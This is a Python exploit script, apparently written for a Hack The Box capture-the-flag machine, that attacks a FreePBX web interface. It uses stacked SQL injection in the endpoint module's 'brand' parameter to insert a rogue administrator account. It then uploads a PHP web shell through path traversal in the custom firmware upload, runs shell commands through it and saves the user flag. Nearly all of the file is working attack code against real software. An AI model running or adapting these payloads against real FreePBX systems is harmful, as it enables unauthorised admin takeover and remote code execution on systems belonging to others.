#!/usr/bin/env python3
import hashlib
import pathlib
import random
import re
import string

import requests
import urllib3

urllib3.disable_warnings()


def rnd(n=8):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def hx(t):
    return "0x" + t.encode().hex()


def main():
    s = requests.Session()
    s.verify = False
    base = "http://connected.htb"
    user = "svc_" + rnd(5)
    pw = rnd(12)
    sha1 = hashlib.sha1(pw.encode()).hexdigest()
    shell_dir = rnd(10)
    shell_name = rnd(8) + ".php"

    def sqli(pl):
        s.get(
            f"{base}/admin/ajax.php",
            params={
                "module": r"FreePBX\modules\endpoint\ajax",
                "command": "model",
                "template": "x",
                "model": "model",
                "brand": pl,
            },
            timeout=120,
        )

    print("[*] SQLi + admin")
    sqli(f"x'; DELETE FROM asterisk.ampusers WHERE username={hx(user)}-- -")
    sqli(
        "x'; INSERT INTO asterisk.ampusers (username,password_sha1,sections) "
        f"VALUES ({hx(user)},{hx(sha1)},0x2a)-- -"
    )
    s.get(f"{base}/admin/config.php", timeout=120)
    r = s.post(
        f"{base}/admin/config.php",
        data={"username": user, "password": pw},
        timeout=120,
    )
    if 'name="username"' in r.text:
        print("[-] login failed")
        return 1
    print("[+] admin ok", user)

    webshell = b'<?php if(isset($_REQUEST["cmd"])){echo "<pre>";system($_REQUEST["cmd"]);echo "</pre>";} ?>'
    files = {
        "dzuuid": (None, "48069f49-c03e-4182-81f7-48e36622e0d3"),
        "dzchunkindex": (None, "0"),
        "dztotalfilesize": (None, str(len(webshell))),
        "dzchunksize": (None, "2000000"),
        "dztotalchunkcount": (None, "1"),
        "dzchunkbyteoffset": (None, "0"),
        "fwbrand": (None, f"../../../var/www/html/{shell_dir}"),
        "fwmodel": (None, "1"),
        "fwversion": (None, "1"),
        "file": (shell_name, webshell, "application/x-php"),
    }
    headers = {
        "Referer": f"{base}/admin/config.php?display=epm_advanced",
        "X-Requested-With": "XMLHttpRequest",
    }
    s.post(
        f"{base}/admin/ajax.php?module=endpoint&command=upload_cust_fw",
        files=files,
        headers=headers,
        timeout=120,
    )
    shell_url = f"{base}/{shell_dir}/{shell_name}"

    def cmd(c):
        r = s.get(shell_url, params={"cmd": c}, timeout=90)
        return r.text.replace("<pre>", "").replace("</pre>", "").strip()

    print("[+] shell", shell_url)
    for c in [
        "id",
        "find / -name user.txt 2>/dev/null | head -20",
        "for f in $(find / -name user.txt 2>/dev/null); do echo ===$f===; cat $f; done",
    ]:
        print(f"--- {c} ---\n{cmd(c)}\n")

    out = cmd("for f in $(find / -name user.txt 2>/dev/null); do cat $f; done")
    m = re.search(r"[0-9a-f]{32}", out)
    loot = pathlib.Path("/home/kali/Desktop/htb/Connected/loot")
    if not m:
        (loot / "shell-output.txt").write_text(out)
        print("[-] flag not found")
        return 1
    flag = m.group(0)
    (loot / "user-flag.txt").write_text(flag + "\n")
    (loot / "copy-paste.txt").write_text(f"user.txt: {flag}\n")
    pathlib.Path("/home/kali/Desktop/htb/copy-paste.txt").write_text(
        f"user.txt: {flag}\n"
    )
    print("FLAG", flag)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())